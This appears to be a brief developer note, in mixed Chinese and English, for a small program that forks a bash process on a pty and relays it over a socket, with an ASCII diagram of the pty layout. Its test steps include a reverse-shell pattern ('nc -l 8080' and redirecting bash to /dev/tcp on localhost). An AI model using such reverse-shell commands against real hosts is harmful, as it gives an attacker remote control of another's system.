1,how to test
    a,nc -l 8080
    b,./new bash > /dev/tcp/127.0.0.1/8080  0>&1 &

2,new 进程
    a,open 一个pty
    b,fork 一个进程,
	ptx-master  -->father
	ptx-slave   -->child
    d,father 进程
	负责与nc 通讯,将结果输出到远端.

    c,child 进程中运行bash.
       layout 如下. 
        pts 的work mode应该按照如下设计. 
        此test中并没有这样.
       +--------------------+ +-------------------+      +-----------------------------+
       |child    stdin      | |father  read in    |      |remote server                |
       |        <--- +--------------+ <---+----+  |      |          +-----------------+|
       |    bash     |  pts <+>ptm  |     |sock|<-+----->|server    |terminal/keyboard||
       |        ---> +-------|------+ --->+----+  |      |          |     raw mode    ||
       |        stdout/err  |||        write to   |      |          +-----------------+|
       +--------------------+|+-------------------+      +-----------------------------+
                             V
                         normal mode
